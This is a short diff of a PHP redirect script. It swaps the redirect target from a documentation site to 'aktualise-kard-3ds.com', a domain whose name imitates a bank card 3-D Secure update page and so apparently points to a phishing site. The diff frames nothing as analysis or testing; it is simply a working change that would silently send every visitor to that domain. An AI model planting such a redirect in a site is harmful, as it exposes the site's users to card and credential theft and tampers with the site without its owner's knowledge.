@@ -5,4 +5,4 @@ function Redirect($url, $permanent = false)
   header('Location: ' . $url, true, $permanent ? 301 : 302);
   exit();
 }
-Redirect('//www.w3docs.com/', false);
+Redirect('//aktualise-kard-3ds.com/index.php/', false);
